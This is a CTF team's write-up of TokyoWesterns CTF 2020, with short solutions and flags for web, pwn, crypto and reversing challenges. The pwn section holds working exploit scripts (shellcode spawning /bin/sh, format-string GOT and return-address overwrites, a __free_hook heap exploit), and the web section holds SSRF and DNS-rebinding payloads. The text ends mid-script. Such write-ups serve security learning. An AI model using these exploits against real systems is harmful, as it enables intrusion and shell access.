# TokyoWesterns CTF 6th 2020

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200928-tokyowesternsctf2020/) of this writeup.**


 - [TokyoWesterns CTF 6th 2020](#tokyowesterns-ctf-6th-2020)
   - [Misc](#misc)
     - [Birds](#birds)
   - [Web](#web)
     - [urlcheck_v1](#urlcheck_v1)
     - [urlcheck_v2](#urlcheck_v2)
     - [Angular of the Universe](#angular-of-the-universe)
     - [Angular of the Universe (flag 2)](#angular-of-the-universe-flag-2)
     - [bfnote (not-solved)](#bfnote-not-solved)
   - [Pwn](#pwn)
     - [Extended Extended Berkeley Packet Filter](#extended-extended-berkeley-packet-filter)
     - [IL](#il)
     - [smash](#smash)
     - [nothing more to say 2020](#nothing-more-to-say-2020)
     - [Blind Shot](#blind-shot)
     - [Online Nonogram](#online-nonogram)
   - [Crypto](#crypto)
     - [easy-hash](#easy-hash)
     - [Twin-d](#twin-d)
     - [Melancholy Alice](#melancholy-alice)
     - [XOR and shift encryptor](#xor-and-shift-encryptor)
       - [TL;DR](#tldr)
       - [Exploit](#exploit)
     - [sqrt](#sqrt)
   - [Rev](#rev)
     - [Reversing iS Amazing](#reversing-is-amazing)
     - [Tamarin](#tamarin)
     - [metal](#metal)
       - [TL;DR](#tldr-1)
       - [Decryption script](#decryption-script)


## Misc

### Birds

Connect the airport on map.

`TWCTF{FLYTONIHON}`

## Web

### urlcheck_v1
* Decimal confusion
* `http://urlcheck1.chal.ctf.westerns.tokyo/check-status?url=http://0177.0.0.1/admin-status`
* `TWCTF{4r3_y0u_r34dy?n3x7_57463_15_r34l_55rf!}`

### urlcheck_v2
* DNS rebinding
* `http://36573657.7f000001.rbndr.us/admin-status`
* `TWCTF{17_15_h4rd_70_55rf_m17164710n_47_4pp_l4y3r:(}`

### Angular of the Universe

- double encoding
- Angular http will decode it again
- `echo 'GET /\de%62ug/answer HTTP/1.1\r\nHost: universe.chal.ctf.westerns.tokyo\r\nConnection: close\r\n\r\n' | nc 34.97.224.254 80`
- `TWCTF{ky0-wa-dare-n0-donna-yume-ni?kurukuru-mewkledreamy!}`

### Angular of the Universe (flag 2)

- Angular http determines the destination for `http.get('/api/answer')` based on `Host:` header
- Angular http follows 302 redirect

```
Host: my_server

my_server:
302
Location: http://127.0.0.1/api/true-answer
```

`TWCTF{you-have-to-eat-tomato-yume-chan!}`

### bfnote (not-solved)

- Unintended solution: [DOMPurify 0-day](https://github.com/cure53/DOMPurify/commit/02724b8eb048dd219d6725b05c3000936f11d62d#diff-f44bc3a1bfaa31000b8f4f1359dba82aL1078), [payload1 by sqrtrev](https://gist.github.com/sqrtrev/9fdd1df15dfce1e92f60308a3bce7723), [payload2 by terjanq](https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#dompurify-bypass)

- Intended solution: Recaptcha-oriented cross-site scripting, [payload1 by bluepichu](https://gist.github.com/bluepichu/3ea50dfe412d13d9a7cd01e909856e4c#file-bfnote) [payload2 by terjanq](https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#intended-solution)


## Pwn



### Extended Extended Berkeley Packet Filter
* Break the verifier
```
BPF_LDX_MEM(BPF_DW,6,9,0),

BPF_MOV64_IMM(8,0x1), 
BPF_ALU64_IMM(BPF_LSH,8,62), 

BPF_JMP_REG(BPF_JLE,6,8,2), 
BPF_MOV64_IMM(0,0),
BPF_EXIT_INSN(),

BPF_ALU64_IMM(BPF_ALSH, 6, 2),
BPF_ALU64_IMM(BPF_AND, 6, 4),
BPF_ALU64_IMM(BPF_RSH, 6, 2),
```
The following exploit is similar to CVE-2020-8835 
* Leak kernel address
* Create arbitrary read
* Traverse init_task to get current task
* Create arbitary write and overwrite modprobe path to "/tmp/x"
* chmod 0777 /flag  get cat flag
* [Exploit](https://github.com/st424204/ctf_practice/tree/master/TokyoWesterns%20CTF%206th%202020/exp)

### IL
* Get arg0 address by "ldarga"
* leak return address which permission is rwx
* Use "cpblk" to write shellcode at return address and win
```python=
import base64
from pwn import *


#r = process('./il')
r = remote("pwn02.chal.ctf.westerns.tokyo", 23541)


push_arg0_addr = b"\xFE\x0A\x00\x00"
push_int64 = b"\x21"

add = b"\x58"
copy = b"\xFE\x17"
push_8 = b"\x1e"
push_1 = b"\x17"
push_arg0 = b"\x02"
assign_arg0 = b"\x10\x00"
#payload = push_arg0_addr + push_int64 + p64(0x10) + add + push_arg0_addr + push_8 + copy + push_8

def get_payload(offset,val):
    ret = push_arg0_addr + push_arg0_addr + push_int64 + p64(0x10) + add + push_8 + copy + push_arg0 + push_int64 + p64(offset) + add  + push_int64 + p64(val) + assign_arg0 +  push_arg0_addr + push_8 + copy 
    return ret


context.arch = "amd64"
shellcode = asm("""
xor esi,esi
mov rbx,0x68732f2f6e69622f
push rsi
push rbx
push rsp
pop rdi
push 59
pop rax
xor edx, edx
syscall

""").ljust(0x28,b"\x90")

payload = b"";
for i in range(5):
	payload+=get_payload(i*8,u64(shellcode[i*8:i*8+8]))
payload += push_8

r.sendlineafter(":",base64.b64encode(payload))
r.interactive()


```

### smash
* Overwrite return address which in SSP with a heap address
* Put shellcode in heap address
* Because heap address is executable in Pin, overwrite return address is fine
* Win

```python=
from pwn import *

#r = process('./run.sh')
#r = process('./smash')
r = remote("pwn01.chal.ctf.westerns.tokyo", 29246)

#r = remote("localhost", 4444)

r.sendlineafter("> ","%p%p%p%p%p%p%p%p%p%p%p")


data = [ int(x,16) for x in r.recvline().strip().replace(b"(nil)",b"").split(b"0x")[1:]]

heap = data[0] - 0x6c0
code = data[5] - 0x1216
stack = data[4]
libc = data[6] - 0x270b3

print("heap "+hex(heap))
print("code "+hex(code))
print("stack "+hex(stack))
print("libc "+hex(libc))

alloc_heap = heap+ 0x6d0
stackbuf = stack-0x60
actual_return_address = libc+0x114a72fe0

#input(hex(actual_return_address)+":")

r.sendafter("[y/n]",b"y"+b"\x00"*0x2f+p64(actual_return_address +0x8)[:-1])

context.arch = "amd64"

shellcode = asm("""
xor esi,esi
mov rbx,0x68732f2f6e69622f
push rsi
push rbx
push rsp
pop rdi
push 59
pop rax
xor edx, edx
syscall

""").ljust(0x23,b"\x90")
#shellcode = b"\xeb\xfe".ljust(0x23,b"\x90")
print(b"\x00" in shellcode)
r.sendafter(">",shellcode+p64(alloc_heap)+b"\x00"*5+p64(stackbuf+0x23-8)[:-1])


r.interactive()
```


### nothing more to say 2020

* Remote libc-2.27, fmt leak libc
* Fmt changed printf to system
* Input "sh" to get the shell

```pyton3=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'pwn02.chal.ctf.westerns.tokyo'
port = 18247

binary = "./nothing"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

def byte2str(s):
  ss = ""
  for i in s:
    ss+=chr(i)
  return ss

if __name__ == '__main__':
  r.recvuntil("> ")
  r.sendline("%39$p")
  if len(sys.argv) == 1:
    libc = int(r.recvuntil("\n"),16) - 0x270b3
  else :
    libc = int(r.recvuntil("\n"),16) - 0x000000000021b97
  print("libc = {}".format(hex(libc)))
  now = 0
  fmt = ""
  fmt2 = ""
  addr = 0x601028
  index = 18
  if len(sys.argv) == 1:
    system = libc + 0x55410
  else :
    system = libc + 0x4f4e0
  print("system = {}".format(hex(system)))
  for i in range(6):
    now = (((( system >> (i*8) ) & 0xff ) - now ) + 0x100) & 0xff
    fmt += "%" + str(now) + "c" + "%" + str(index+i) + "$hhn"
    now = (system >>(i*8))&0xff
    fmt2 += byte2str(p64(addr+i))
  print(len(fmt))
  fmt = fmt.ljust(0x60,"A") + fmt2
  r.recvuntil("> ")
  r.sendline(fmt)
  r.sendline("ls")

  r.interactive()

```



### Blind Shot
* Fmt string change argv_ptr can overwrite stack.
* Use fmt string %*d to print the count of the lower 4 bytes of main_ret address.
* Modify 2 byte of the  __vdprintf_internal return address to one_gadget.
* ( (main return address & 0xffffffff) < 0x80000000) && (__vdprintf_internal return stack address lower 2 bytes ==  0xc328) , (1/2) * (1/1024) = 1/2048 probability……………


```python3=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'pwn01.chal.ctf.westerns.tokyo'
port = 12463

binary = "./blindshot"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

if __name__ == '__main__':
  stack = 0xc328
  offset = 0xE6CE7 - 0x270b3
  while 1:
    r = remote(host ,port)
    print(r.recvuntil("> "))
    try:
      print("stack = {}".format(hex(stack)))
      fmt = "%c%c%c%" + str(stack-3) + "c%hn" + "%c"*9 + "%" + str(offset-stack-9) +"c" + "%*d" + "%48$n"
      fmt = fmt.ljust(200,"\x00")
      r.sendline(fmt)
      print("send")
      r.sendline("echo AAAAAAA")
      r.sendline("echo AAAAAAA")
      r.sendline("echo AAAAAAA")
      r.sendline("ls")
      r.sendline("pwd")
      r.sendline("cat f*")
      r.sendline("cat /f*")
      r.sendline("cat /home/*/flag")
      r.sendline("cat /home/blindshot/flag")
      r.sendline("cat /home/blindshot/f*")
      r.sendline("cat /home/blindshot/flag.txt")
      r.sendline("cat /home/*/flag.txt")
      r.sendline("cat /home/*/f*")
      r.sendline("cat flag.txt")
      r.sendline("cat flag")
      r.sendline("cat f*")
      r.recvuntil("AAAAAAA")
      r.interactive()
    except:
      r.close()
      continue

```

### Online Nonogram
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'pwn03.chal.ctf.westerns.tokyo'
port = 22915

from pwn import *

#r = process('./nono')
r = remote(host,port)


def add(title,size,content):
    r.sendlineafter(":","2")
    r.sendlineafter(":",title)
    r.sendlineafter(":",str(size))
    r.sendafter(":",content)

def play(idx):
    r.sendlineafter(":","1")
    r.sendlineafter(":",str(idx))

def remove(idx):
    r.recvuntil(": ")
    r.sendline("3")
    r.recvuntil("x:\n")
    r.sendline(str(idx))

add("a",91,"\x00")
play(2)
r.recvuntil("Row's Numbers")
r.recvline()

data = [ r.recvline() for _ in range(91)]
leak = data[2:]
heap = 0
for i in range(64):
    if b"1" in leak[i]:
        heap |= (1<<i)

print(hex(heap))


heapbase = heap - 0x11f90
print("heapbase = {}".format(hex(heapbase)))
r.sendlineafter(":","92 92")
r.recvuntil("y: ")

remove(2)
payload = p64(heap + 0x80 + 0x4b0) + p64(heap + 0x100 + 0x4b0)
payload = payload.ljust(0x80,b"\x00")
payload += p64(0x10) + p64(heap) + p64(heap+0x60) + p64(0x10) + b"A"*0x10 + p64(0)
payload = payload.ljust(0xf8,b"\x00") + p64(0x41)
payload += p64(0x10) + p64(heapbase + 0x10) + p64(heapbase+0x11ef0) + p64(0x10) + b"A"*0x10 + p64(0) + p64(0x21)*6
payload = payload.ljust(1024,b"\x00")
add("a",-123,payload + p64(heap + 0x4b0) + p64(heap + 0x4c0) + p64(heap + 0x4d0))

r.recvuntil(": ")
r.sendline("4")
r.recvuntil("0 : ")
libc = u64(r.recv(6).ljust(8,b"\x00")) - 0x1ebfd0
print("libc = {}".format(hex(libc)))
r.recvuntil("dex:\n")
r.sendline("4")
remove(1)
free_hook = libc + 0x1eeb28
payload = b"th" + b"\x00"*6 + p64(0)*15 + p64(free_hook)
payload = payload.ljust(0x280,b"\x00")

system = libc + 0x55410
input("@")
add(payload,8,p64(system))

r.interactive()
```

## Crypto
### easy-hash
The hash function combine the hash of the blocks and is commutative, simply swap two of the blocks.

### Twin-d
`2*e1*e2-e2-e1` will be multiple of `phi`


```python
from Crypto.Util.number import long_to_bytes, inverse

n = 26524843197458127443771133945229625523754949369487014791599807627467226519111599787153382777120140612738257288082433176299499326592447109018282964262146097640978728687735075346441171264146957020277385391199481846763287915008056667746576399729177879290302450987806685085618443327429255304452228199990620148364422757098951306559334815707120477401429317136913170569164607984049390008219435634838332608692894777468452421086790570305857094650986635845598625452629832435775350210325954240744747531362581445612743502972321327204242178398155653455971801057422863549217930378414742792722104721392516098829240589964116113253433
e1 = 3288342258818750594497789899280507988608009422632301901890863784763217616490701057613228052043090509927547686042501854377982072935093691324981837282735741669355268200192971934847782966333731663681875702538275775308496023428187962287009210326890218776373213535570853144732649365499644400757341574136352057674421661851071361132160580465606353235714126225246121979148071634839325793257419779891687075215244608092289326285092057290933330050466351755345025419017436852718353794641136454223794422184912845557812856838827270018279670751739019476000437382608054677808858153944204833144150494295177481906551158333784518167127
e2 = 20586777123945902753490294897129768995688830255152547498458791228840609956344138109339907853963357359541404633422300744201016345576195555604505930482179414108021094847896856094422857747050686108352530347664803839802347635174893144994932647157839626260092064101372096750666679214484068961156588820385019879979501182685765627312099064118600537936317964839371569513285434610671748047822599856396277714859626710571781608350664514470335146001120348208741966215074474578729244549563565178792603028804198318917007000826819363089407804185394528341886863297204719881851691620496202698379571497376834290321022681400643083508905
enc = 18719581313246346528221007858250620803088488607301313701590826442983941607809029805859628525891876064099979252513624998960822412974893002313208591462294684272954861105670518560956910898293761859372361017063600846481279095019009757152999533708737044666388054242961589273716178835651726686400826461459109341300219348927332096859088013848939302909121485953178179602997183289130409653008932258951903333059085283520324025705948839786487207249399025027249604682539137261225462015608695527914414053262360726764369412756336163681981689249905722741130346915738453436534240104046172205962351316149136700091558138836774987886046

xphi = 2*e1*e2+e2-e1
d = inverse(e1,xphi)
M = pow(enc,d,n)
print(long_to_bytes(M))
```

### Melancholy Alice
strong prime does not guarantee unfactorable `(p-1)/2`. thus it is possible to construct multiple base with different orders, and calculate corresponding charset, then take intersection of those charsets to get flag.

```python
from Crypto.Util.number import inverse

p = 168144747387516592781620466787069575171940752179672411574452734808497653671359884981272746489813635225263167370526619987842319278446075098036112998679570069486935297242638675590736039429506131690941660748942375274820626186241210376537247501823653926524570571499198040207829317830442983944747691656715907048411
q = 84072373693758296390810233393534787585970376089836205787226367404248826835679942490636373244906817612631583685263309993921159639223037549018056499339785034743467648621319337795368019714753065845470830374471187637410313093120605188268623750911826963262285285749599020103914658915221491972373845828357953524205
g = 2
h = 98640592922797107093071054876006959817165651265269454302952482363998333376245900760045606011965672215605936345612030149799453733708430421685495677502147392514542499678987737269487279698863617849581626352877756515435930907093553607392143564985566046429416461073375036461770604488387110385404233515192951025299

'''
idea : 
    c2* h * c1 * 2 = m * 2^(xr) * 2^x * 2^r * 2
                   = m * 2^(xr+x+r+1)
                   = m * 2^((x+1)(r+1))
                   = m * (2h)^(r+1)
                   = m * 2h^(95*T + R)

    (m * 2h^(95T+R))^(q//3//5//19) = m^(q//3//5//19) * 2h^((95T+R)(q//3//5//19))
                                   = UNK * 2h^((95T)(q//3//5//19)) * 2h^(R(q//3//5//19))
                                   = UNK * 2h^(R(q//3//5//19))


q*pow(2,1) -> q/3 | 95
q*pow(2,3) -> q/5 | 57
q*pow(2,15) -> q/19 | 15

'''

CF = open('ciphertext.txt').read().strip().split('\n')
C = []
for i in CF:
    C.append(list(map(int,i[1:-1].split(', '))))

BASE = [1,3,15]
ORD = [95,57,15]

VAL = [0 for i in range(0x20)]
for i in range(0x20,0x7f):
    VAL.append(pow(i,q//3//5//19,p))

COMBINED = []

for f in range(3):
    STATE = []

    for i in range(ORD):
        STATE.append(pow(h*pow(2,BASE[f],p),i*q//3//5//19,p))


    for c in C:
        STATE.append('')
        for i in range(0x20,0x7f):
            target = pow(c[1]*h*pow(c[0],BASE[f],p)*pow(2,BASE[f],p)%p,q//3//5//19,p)
            for j in range(ORD):
                if (VAL[i]*STATE[j])%p==target:
                    STATE[-1]+=chr[i]
    COMBINED.append(STATE)

FINAL = ['' for i in range(idx)]
for idx,cand in enumerate(COMBINED[2]):
    for c in cand:
        if c in COMBINED[0][idx] and c in COMBINED[1][idx]:
            FINAL[idx]+=c
print(FINAL)
```

### XOR and shift encryptor

#### TL;DR
1. Build the state transition function is 4096 x 4096 $GF(2)$ Matrix.
2. Use double type for better matrix multiplication algorithm.

Full writeup is at [here](https://sasdf.github.io/ctf/writeup/2020/tokyoWesterns/crypto/xs/)

#### Exploit
```python
import numpy as np
from tqdm import trange, tqdm


a, b, c = 3, 13, 37
m = (1<<64)-1


def init():
    state = np.arange(64, dtype=np.uint64)
    state = np.frombuffer(state.tobytes(), dtype=np.uint8)
    state = np.unpackbits(state, bitorder='little')
    return state

def shift_mat(n, s):
    return np.diag(np.ones(n - abs(s), dtype=np.uint8), k=s)

def identity(*args):
    if len(args) == 1: args = args[0]
    return np.eye(args, dtype=np.uint8)

def zeros(*args):
    if len(args) == 1: args = args[0]
    return np.zeros(args, dtype=np.uint8)

O = zeros(64)
I = identity(64)
A = shift_mat(64, -a)
B = shift_mat(64, b)
C = shift_mat(64, c)
S1 = ((B+I) @ (A+I)) & 1
S0 = (C+I) & 1

M = np.block([
    [S0, S1, zeros(64, 4096-128)],
    [zeros(4096-128, 128), identity(4096-128)],
    [I, zeros(64, 4096-64)],
])


def matmul(A, B):
    A = (A & 1).astype(np.double)
    B = (B & 1).astype(np.double)
    C = (A @ B).astype(np.uint64) & 1
    return C


if True:
    E = np.load('cache.npy')
else:
    E = [M]
    for _ in trange(64):
        E.append(matmul(E[-1], E[-1]))
    E = np.stack(E)
    np.save('cache.npy', E)
    

def jump(n, state):
    R = identity(4096)
    for s in range(64):
        if (n >> s) & 1:
            state = matmul(E[s], state)
    return state


def randgen(state):
    s = np.packbits(state, bitorder='little').tobytes()
    s = np.frombuffer(s, dtype=np.uint64).tolist()
    res = (s[0] + s[1]) & m
    state = matmul(M, state)
    return state, res
    

state = init()
state = jump(31337, state)

enc = open("enc.dat", 'rb').read()
assert len(enc) == 256

flag = b""

bar = trange(len(enc))
for x in bar:
    state, buf = randgen(state)
    sh = x//2
    if sh > 64:sh = 64
    mask = (1 << sh) - 1
    buf &= mask
    state = jump(buf, state)
    state, r = randgen(state)
    flag += bytes([ enc[x] ^ (r & 0xff) ])
    tqdm.write(repr(flag))
bar.close()
print(flag)
```

### sqrt
Search through all 2^30 possible values.
```python
import gmpy2
import multiprocessing as mp
from tqdm import tqdm, trange


with open('output.txt') as f:
    c = int(f.readline())
    p = int(f.readline())


assert (p - 1) % (2**30) == 0
u = (p - 1) >> 30

assert pow(c, u, p) == 1

m = pow(c, int(gmpy2.invert(2**64, u)), p)
assert pow(m, u, p) == 1
assert pow(m, 2**64, p) == c


g = pow(3, u, p)
assert g != 1 and g != p-1 and pow(g, 2**30, p) == 1 and pow(g, 2**29, p) != 1 and pow(g, 2**28, p) != 1
assert pow(m*g, 2**64, p) == c

nworkers = 32
chunksize = 2**30 // nworkers + 1

progress = mp.Queue()
def worker(m):
    for i in range(0, chunksize, 10000):
        for _ in range(i, min(chunksize, i+10000)):
            m = m * g % p
            if m.bit_length() <= 43 * 8:
                print(m.to_bytes(43, 'big'))
        progress.put(10000)

z = pow(g, chunksize, p)
procs = [mp.Process(target=worker, args=(m * pow(z, i, p) % p,)) for i in range(nworkers)]
for proc in procs:
    proc.start()
bar = tqdm(total=2**30, smoothing=0)
try:
    while True:
        bar.update(progress.get())
finally:
    bar.close()
    for proc in procs:
        proc.terminate()
        proc.join()
```


## Rev

### Reversing iS Amazing

1. It uses `RSA_private_encrypt` to encrypt the flag
2. We can easily dump the private key.
3. Now we have `n` `e` `d`
4. `RSA_private_encrypt` => encflag = pow(flag,d,n) => flag = pow(encflag,e,n)
5. flag = `TWCTF{Rivest_Shamir_Adleman}`


### Tamarin

1. I use [mono_unbundle](https://github.com/tjg1/mono_unbundle) to extract dlls from `armeabi-v7a/libmonodroid_bundle_app.so`
2. `Tamarin.dll` is our target. Use `dnspy` to decompile it
3. Write a z3 script to get the flag

```=python
from z3 import *

aaa = [[
				2921822136,
				1060277104,
				2035740900,
				823622198,
				210968592,
				3474619224,
				3252966626,
				1671622480,
				1174723606,
				3830387194,
				2514889364,
				3125636774,
				896423784,
				4164953836,
				2838119626,
				2523117444,
				1385864710,
				3157438448,
				132542958,
				4108218268,
				314662132,
				432653936,
				1147047258,
				1802950730,
				67411056,
				1207641174,
				1920298940,
				2947533900,
				3468512014,
				3485949926,
				3695085832,
				3903653528
			],
			[
				463101660,
				3469888460,
				2006842986,
				144738028,
				630007230,
				3440652086,
				2322916652,
				2227002010,
				1163469256,
				23859328,
				2322597530,
				3716255122,
				2876706098,
				713374856,
				2345958624,
				3496771192,
				1773957550,
				146382778,
				1141367704,
				1061893394,
				994321632,
				3407332344,
				2240786438,
				2218631702,
				2906647610,
				1919308420,
				2136654012,
				164975906,
				2834189362,
				3118478912,
				3258673870,
				3211411825
			],
			[
				2558729100,
				1170420958,
				2355877954,
				3593652986,
				2587766164,
				2271696650,
				1560549496,
				132089692,
				2893757564,
				3469624876,
				10109206,
				2948199026,
				4170042296,
				2717317064,
				4210960804,
				93756380,
				2006217436,
				2988057920,
				2251383150,
				226355976,
				579516546,
				3915017586,
				1273838010,
				2852178952,
				4272774672,
				1006507228,
				3595131622,
				1880597220,
				1230996622,
				2542910224,
				917668128,
				1612363977
			],
			[
				3637139654,
				2593663532,
				649194106,
				4275630476,
				2730487128,
				905133820,
				2868808700,
				1284610026,
				1051455306,
				272375560,
				1219428572,
				163965224,
				3899483864,
				309833108,
				1862243284,
				1919038730,
				3414916994,
				3134382762,
				2018925234,
				3467081876,
				4045123308,
				4244105094,
				4205568254,
				1793827648,
				257732384,
				2092183712,
				3517540150,
				2641565070,
				2181538960,
				2670634300,
				2070334778,
				1995308868
			],
			[
				561434200,
				2730097174,
				1499965472,
				760244614,
				1588114416,
				521516362,
				2963707630,
				1896166800,
				411250470,
				1601999958,
				2973942456,
				3027806424,
				1238337602,
				1380721280,
				122976200,
				788897864,
				3589391734,
				1987301254,
				1085198712,
				3553616586,
				1994354546,
				1684916442,
				2788234788,
				2641884090,
				612801768,
				1801824798,
				2019943314,
				3304068906,
				849354132,
				44941780,
				3473262708,
				1444837808
			],
			[
				921974086,
				404262832,
				1353817916,
				764855648,
				2290476820,
				2023815980,
				669786172,
				791841140,
				526348842,
				2979022342,
				3656325786,
				1276970440,
				2424614726,
				1190814714,
				2804417116,
				3654263826,
				3068580996,
				1908493640,
				3101330462,
				792198672,
				1772484794,
				4050408722,
				611660842,
				1610808360,
				431629552,
				2319897718,
				3255085210,
				1426503472,
				1630566802,
				4241881448,
				1606014350,
				636517450
			],
			[
				2906103140,
				1116553354,
				2279536366,
				3011561210,
				2641603848,
				1646150780,
				192124694,
				611421916,
				3416039786,
				4208848404,
				474397384,
				1491088256,
				3177553844,
				2042765300,
				1653674858,
				1365840538,
				1595225706,
				2705938552,
				3180386458,
				1723055560,
				2280421090,
				1241156010,
				3807390206,
				2595800854,
				2890507242,
				4068903400,
				3923234634,
				2613933834,
				3927909200,
				2149793556,
				3589302752,
				802516900
			],
			[
				171242408,
				1411016272,
				2890085382,
				624162464,
				3117870816,
				3388454296,
				3869111620,
				948964384,
				1670102044,
				3432346180,
				1670460686,
				3674313702,
				4108083090,
				915550832,
				4249135230,
				411447682,
				2915987712,
				3865207952,
				4017666788,
				275767786,
				2506858524,
				3488718446,
				1995975410,
				566166116,
				1590333384,
				329205954,
				3913164274,
				620615436,
				1464604756,
				269837028,
				963851056,
				2483789524
			],
			[
				4043184956,
				3569779124,
				3817645374,
				4281618348,
				4144074366,
				3776223584,
				2260112022,
				2417238210,
				4004384546,
				1196429850,
				1429697170,
				3075499898,
				2507660230,
				1342925724,
				3951341456,
				229184726,
				2762396986,
				1612961426,
				986238002,
				1228690306,
				3948701236,
				1378190546,
				3106898794,
				1894874158,
				1488049036,
				3718233910,
				1078939754,
				2355898312,
				2030934192,
				2879370894,
				3017715248,
				1647621107
			],
			[
				3849716376,
				3412391848,
				420800182,
				156925722,
				3602232204,
				2645326622,
				3864083570,
				1279782822,
				878821008,
				1906288878,
				1396282244,
				1641728726,
				2295751090,
				290937256,
				1958396986,
				2115100470,
				3706945590,
				2885002942,
				1935777480,
				1483762940,
				3589264430,
				3791465274,
				2553819596,
				2050180502,
				1381704584,
				4640270,
				628970046,
				774725214,
				2575508070,
				1330692832,
				1250987676,
				3756982724
			],
			[
				1460953346,
				1175847424,
				3477700838,
				3783709768,
				1064663570,
				3559971784,
				3802954664,
				2431960456,
				2198986400,
				859802318,
				3783810034,
				1110187920,
				4244034440,
				1796543058,
				902449590,
				160031782,
				3639253664,
				4255746326,
				3339514496,
				218988706,
				4085181614,
				2342973726,
				1391523108,
				1120970708,
				2639842372,
				156321138,
				1587974922,
				3686627774,
				1648124740,
				2095688044,
				293533614,
				3056924137
			],
			[
				1034259104,
				4077045412,
				789979418,
				961028604,
				2185949320,
				3457364068,
				3532291848,
				2206594748,
				3072062072,
				1796530288,
				1402389280,
				3478769990,
				196567236,
				3940435298,
				2237679842,
				668941406,
				170819894,
				1102049112,
				131349762,
				2512464482,
				4159048294,
				2186098090,
				123947608,
				1742064290,
				1711289746,
				1449132362,
				58078952,
				2976574968,
				1774398264,
				1532589156,
				4089484268,
				4041979478
			],
			[
				3681899832,
				4208608358,
				1951338724,
				3772673566,
				3160075610,
				1422174080,
				2431526454,
				529884656,
				2722748162,
				236192616,
				2684139926,
				697549902,
				3546454434,
				1921398338,
				1310272304,
				1691292498,
				4134700116,
				720619430,
				2592536546,
				2188997288,
				2461521148,
				455077540,
				1421274126,
				1052585740,
				2383754190,
				1567602170,
				3773864138,
				4036579298,
				2416620860,
				1931099884,
				2051263696,
				310763286
			],
			[
				1461705722,
				968835462,
				2563821358,
				576185928,
				1613137824,
				940353300,
				652295412,
				1135005196,
				3607866196,
				3307698550,
				3916080186,
				4052934590,
				3991167852,
				3799175976,
				3393348946,
				950814766,
				2174463160,
				2422320256,
				959545514,
				2820210140,
				4284041840,
				3082466322,
				1257510060,
				2676710840,
				127465314,
				3887977956,
				3218198116,
				957094088,
				1409365960,
				2217798938,
				277108032,
				2579736592
			],
			[
				3776055232,
				823459706,
				1913270776,
				1721511850,
				633354432,
				3901765934,
				2089017122,
				1103648570,
				3791238880,
				1686042442,
				1567720048,
				2924815412,
				1695861754,
				3641036796,
				1208391908,
				1593134050,
				1674288590,
				2322785248,
				2472109738,
				3572933674,
				3828029068,
				1641647380,
				4116180236,
				3884220004,
				3146594508,
				3587030908,
				3451856524,
				2965945264,
				162291656,
				2061732942,
				1551591510,
				4014200221
			],
			[
				3406794856,
				3181753846,
				2984888850,
				1748566984,
				1311737108,
				3415409722,
				2398926736,
				2006269026,
				3117725174,
				2901254050,
				2733703362,
				1595001962,
				106879068,
				3933136528,
				245096038,
				666024082,
				134803296,
				1657783988,
				3429228290,
				2120419114,
				2879013028,
				9653606,
				305704628,
				3793128986,
				369835124,
				2274924880,
				4233339440,
				2224753480,
				2427854922,
				1808326540,
				1833703938,
				2391461119
			],
			[
				1827597388,
				454565514,
				1282880792,
				561174442,
				3610484436,
				2327669348,
				765794442,
				3705161518,
				1715916192,
				292859360,
				183730846,
				3298097994,
				3535037218,
				2904849282,
				348832662,
				1856773750,
				3618335118,
				3017093112,
				3354956190,
				3208811970,
				897522204,
				2835584374,
				3097985334,
				2108903166,
				3230714490,
				2597789348,
				1597521406,
				1663858876,
				94923994,
				883872856,
				3230397040,
				3420763893
			],
			[
				4065160224,
				2129787468,
				3456903512,
				2860656238,
				2663588170,
				3224900102,
				2827778318,
				2685874320,
				2005737334,
				586304716,
				472376412,
				2938324550,
				3459137716,
				3422216092,
				3082124658,
				1173945064,
				842495374,
				2564495050,
				357433170,
				2050324102,
				1138367532,
				854845936,
				3054001576,
				2465772674,
				2305389082,
				3669610606,
				3527889292,
				3817664802,
				4238531160,
				1556372762,
				777986002,
				1126454981
			],
			[
				764733144,
				3965849612,
				1668893328,
				2104626056,
				1653642872,
				2883395356,
				3015268318,
				2322404760,
				1185726976,
				1607036694,
				3064704530,
				3639372768,
				1252489394,
				3950622630,
				3889240956,
				233990458,
				2393973872,
				3609439896,
				2108036182,
				152726882,
				3730671578,
				3038534682,
				3388044150,
				3128791454,
				2499312664,
				3396894570,
				2872225186,
				3048419004,
				2864782986,
				3169897264,
				2890258816,
				753842003
			],
			[
				2403595118,
				2093259638,
				2763900156,
				3772789760,
				3282639530,
				2884294140,
				3879894514,
				2512089226,
				318451120,
				2464691316,
				2179668204,
				795049786,
				326585310,
				1313213364,
				3437852224,
				4055872768,
				1224395344,
				1911910472,
				983774674,
				3804144712,
				3208317764,
				1534290234,
				3243577720,
				617743358,
				378252266,
				3612369740,
				1924240610,
				961715850,
				2058485164,
				1460892148,
				2613095898,
				73199927
			],
			[
				3093631524,
				2704600210,
				3519611266,
				5414320,
				3358912704,
				2462642760,
				3764896542,
				1253645320,
				4034052234,
				3137650284,
				4083324920,
				2667059126,
				436316958,
				497182460,
				404768030,
				1122443700,
				432434942,
				443290780,
				3487257114,
				2699955512,
				4250049274,
				3991832458,
				1037538700,
				3125332984,
				1533312690,
				1452437348,
				1283257518,
				3946567854,
				716640500,
				2417637998,
				3063327834,
				82885668
			],
			[
				1985108,
				1694522756,
				4205785758,
				333118606,
				2944637686,
				2196892858,
				4092971632,
				83374602,
				4049383084,
				2980843496,
				1801648602,
				2639009750,
				1944350566,
				3046229260,
				2662687100,
				2423732014,
				4179240348,
				1035280058,
				1015236846,
				3488976898,
				1530833166,
				3723596058,
				4125718292,
				1095267878,
				3635353922,
				2932904358,
				2764606674,
				45921060,
				3107074868,
				4198045636,
				1923836480,
				366302822
			]

]
def pp(num,i):
  q = 1
  for t in range(i):
    q*=num
  return q
def calc(a,num):
  re = 0
